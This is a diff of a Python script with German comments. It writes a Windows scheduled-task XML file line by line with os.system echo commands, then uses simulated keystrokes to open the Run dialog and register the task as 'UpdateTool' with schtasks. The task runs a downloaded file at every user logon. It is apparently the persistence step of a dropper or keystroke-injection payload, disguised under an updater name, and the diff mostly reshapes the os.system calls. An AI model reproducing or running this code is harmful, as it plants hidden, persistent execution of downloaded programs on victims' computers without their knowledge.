@@ -63,18 +63,22 @@ os.system(r'cmd /c "echo ^<?xml version="1.0" encoding="UTF-16"?^> >> ' + newpat
 + r'echo   ^</RegistrationInfo^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo   ^<Triggers^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<LogonTrigger^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo       ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo       ^<UserId^>' + hostuser + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname + ' & '
++ r'echo       ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + '\\' + xmlname
++ '"')
+os.system(r'echo       ^<UserId^>' + hostuser + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^</LogonTrigger^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo   ^</Triggers^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo   ^<Principals^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo     ^<Principal id="Author"^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo       ^<UserId^>' + mysid + '^</UserId^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo       ^<LogonType^>InteractiveToken^</LogonType^> >>' + newpath_tmp + '\\' + xmlname + ' & '
++ r'echo     ^<Principal id="Author"^> >>' + newpath_tmp + '\\' + xmlname
++ '"')
+os.system(r'echo       ^<UserId^>' + mysid + r'^</UserId^> >>' + newpath_tmp + '\\' + xmlname
++ '"')
+os.system(r'echo       ^<LogonType^>InteractiveToken^</LogonType^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo       ^<RunLevel^>LeastPrivilege^</RunLevel^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^</Principal^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo   ^</Principals^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo   ^<Settings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
++ r'echo   ^</Principals^> >>' + newpath_tmp + '\\' + xmlname
++ '"')
+os.system(r'echo   ^<Settings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<DisallowStartIfOnBatteries^>true^</DisallowStartIfOnBatteries^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^> >>' + newpath_tmp + '\\' + xmlname + ' & '
@@ -83,8 +87,9 @@ os.system(r'cmd /c "echo ^<?xml version="1.0" encoding="UTF-16"?^> >> ' + newpat
 + r'echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<IdleSettings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo       ^<Duration^>PT10M^</Duration^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo       ^<WaitTimeout^>PT1H^</WaitTimeout^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^> >>' + newpath_tmp + '\\' + xmlname + ' & '
++ r'echo       ^<WaitTimeout^>PT1H^</WaitTimeout^> >>' + newpath_tmp + '\\' + xmlname
++ '"')
+os.system(r'echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo       ^<RestartOnIdle^>false^</RestartOnIdle^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^</IdleSettings^> >>'  + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^> >>' + newpath_tmp + '\\' + xmlname + ' & '
@@ -93,8 +98,9 @@ os.system(r'cmd /c "echo ^<?xml version="1.0" encoding="UTF-16"?^> >> ' + newpat
 + r'echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<WakeToRun^>false^</WakeToRun^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo     ^<Priority^>7^</Priority^> >>' + newpath_tmp + '\\' + xmlname + ' & '
-+ r'echo   ^</Settings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
++ r'echo     ^<Priority^>7^</Priority^> >>' + newpath_tmp + '\\' + xmlname
++ '"')
+os.system(r'echo   ^</Settings^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo   ^<Actions Context="Author"^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo     ^<Exec^> >>' + newpath_tmp + '\\' + xmlname + ' & '
 + r'echo       ^<Command^>' + r'C:' + newpath_home + '\\' + downloadname + '^</Command^> >>' + newpath_tmp + '\\' + xmlname + ' & '
@@ -107,6 +113,7 @@ print('xml datei geschrieben')
 time.sleep(0.5)
 
 #schtask aus xml erstellen
+
 # Ausführung öffnen
 keyboard.press(Key.cmd)
 keyboard.press('r')
@@ -122,11 +129,11 @@ keyboard.release(Key.enter)
 time.sleep(1)
 
 keyboard.type(r'schtasks /create /tn "UpdateTool" /xml "' + newpath_tmp + '\\' + xmlname)
+time.sleep(0.4)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
+time.sleep(1)
 keyboard.type('exit')
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
-
-#os.system()
-print("fertig")
+#print("fertig")
